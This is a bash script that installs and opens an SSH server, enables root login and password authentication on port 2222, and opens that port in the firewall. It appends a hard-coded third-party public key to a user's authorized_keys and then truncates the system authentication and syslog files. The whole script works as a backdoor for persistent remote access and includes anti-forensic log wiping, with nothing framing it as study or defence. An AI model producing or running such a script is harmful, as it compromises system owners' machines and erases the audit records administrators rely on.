#!/bin/bash

clear_logs() {
    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        DISTRO=$ID
    else
        exit 1
    fi

    case "$DISTRO" in
        ubuntu|debian)
            LOG_FILES=(
                "/var/log/auth.log"
                "/var/log/syslog"
            )
            ;;
        centos|rhel|fedora|rocky|almalinux)
            LOG_FILES=(
                "/var/log/secure"
                "/var/log/messages"
            )
            ;;
        *)
            exit 1
            ;;
    esac

    for LOG_FILE in "${LOG_FILES[@]}"; do
        if [[ -f $LOG_FILE ]]; then
            truncate -s 0 "$LOG_FILE"
        fi
    done

    if command -v systemctl > /dev/null 2>&1; then
        systemctl restart rsyslog || true
    fi
}

SSH_CONFIG_FILE="/etc/ssh/sshd_config"
NEW_PORT=2222
AUTHORIZED_KEYS_FILE="/home/tu_usuario/.ssh/authorized_keys"
PUBLIC_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDHWMiZwCJ+GPt6o1IUgTbInNOyfJzBabGifckWe+PywK+PhPicjCHTb+RW5XMi7DeHcheH4lj9YmzNrvPw4E7N27LidzTF9+Bwgy2UONAFjTEsI4ErBaC3Oh9bNgZLolvYIFXoTm7G2gPNCJUsyoR7GXKN2nfgwtRP/PXxiJ/tRiU9ewLrVTe11TzqiBIrpa8KwlOIdgsRaFvIMrhvfZyhkNV0PPfQiMndTIE53JllgXH1g405I2UMg/l3icAVtULkq5uyIgbuOKN0QKK2a6Q7YfagY4k8YD7avEztvPmP/0TF1KmQNvQ8uE55ukF55n36Xm+QylHCJpn3alTt50x26Rpzw2p9h/jxtCfIYRhf580KjEgYApUtyDc/pM4Uss40vPTH/APNMPq2X+ZXEP/9+nWqHEzOXHzsM5+gyMQV60VsUi/0Ei5sJydD94QTonF0D9gU9snOpjCm+DdQt9D84kTI9Sm08V3s/zFq39MY9Q+/PD3SMnZ8dJ5lR3Xc7peDC1msyV0kxYopFc1G+icR8LLkhgV45Zx+Vg5JB+sKiMTFxtofHTUqq1N6V8Om231CrV+XGfkIOlVFU9+trR4w0Xll4hq4ZVz0xS3Dtt64wFoHqKJQpYtXIPkR9H+Jy6EXZZHW9S5l5JpyVNoupmAnrVW3STT7Qej7EPnOmNBXvw== meyers@iutgestb113
"

install_ssh() {
    if ! command -v ssh > /dev/null 2>&1; then
        sudo apt update > /dev/null 2>&1
        sudo apt install openssh-server -y > /dev/null 2>&1
        [[ $? -ne 0 ]] && exit 1
    fi
}

enable_ssh_service() {
    sudo systemctl start ssh
    sudo systemctl enable ssh
}

configure_ssh() {
    sudo sed -i "s/^#*PermitRootLogin .*/PermitRootLogin yes/" "$SSH_CONFIG_FILE"
    sudo sed -i "s/^#*Port .*/Port $NEW_PORT/" "$SSH_CONFIG_FILE"
    sudo sed -i "s/^#*PasswordAuthentication .*/PasswordAuthentication yes/" "$SSH_CONFIG_FILE"
    sudo sed -i "s/^#*PubkeyAuthentication .*/PubkeyAuthentication yes/" "$SSH_CONFIG_FILE"
}

restart_ssh() {
    sudo systemctl restart ssh
    [[ $? -ne 0 ]] && exit 1
}

configure_firewall() {
    if command -v ufw > /dev/null; then
        sudo ufw allow "$NEW_PORT"/tcp
        sudo ufw reload
    fi
}

add_public_key() {
    mkdir -p "$(dirname "$AUTHORIZED_KEYS_FILE")"
    chmod 700 "$(dirname "$AUTHORIZED_KEYS_FILE")"

    if ! grep -qxF "$PUBLIC_KEY" "$AUTHORIZED_KEYS_FILE" 2>/dev/null; then
        echo "$PUBLIC_KEY" >> "$AUTHORIZED_KEYS_FILE"
        chmod 600 "$AUTHORIZED_KEYS_FILE"
    fi
}

main() {
    install_ssh
    enable_ssh_service
    configure_ssh
    restart_ssh
    configure_firewall
    add_public_key
    clear_logs
    exit 0
}

main
